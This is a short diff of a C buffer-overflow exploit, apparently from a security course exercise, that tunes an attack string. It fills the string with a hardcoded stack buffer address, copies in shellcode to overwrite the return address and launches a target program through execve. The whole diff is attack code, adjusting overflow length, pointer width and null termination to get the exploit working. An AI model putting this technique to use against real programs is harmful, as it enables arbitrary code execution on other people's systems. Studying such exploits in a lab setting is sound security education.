@@ -16,7 +16,7 @@ main(int argc, char* argv[])
         int ripAddr = 0x2021fe88;
         int bufAddrStart = 0x2021fe10;
         int bufAddrEnd = bufAddrStart + 96;
-        int overflowSize = ripAddr - bufAddrStart;
+        int overflowSize = ripAddr - bufAddrStart + 5;
         
         // Set up arg list for execve call
 	args[0] = TARGET;
@@ -26,15 +26,17 @@ main(int argc, char* argv[])
 	env[0] = NULL;
         
         // Create attack string
-        long *ptr = (long *) args[1];
+        int *ptr = (int *) args[1];
         int i; // Have to do this in C99 ffs
-        for (i = 0; i < overflowSize / 8; ++i) {
+        for (i = 0; i < overflowSize; i += 4) {
             // Fill string with address of buffer
-            *(ptr + i) = (int) bufAddrStart; 
+            *(ptr++) = (int) bufAddrStart; 
         }
         for (i = 0; i < strlen(shellcode); ++i) {
             args[1][i] = shellcode[i];
         }
+        // Ensure NULL terminated
+        args[1][overflowSize - 1] = '\0';
         
         // Do execve call
 	if ( execve (TARGET, args, env) < 0 )
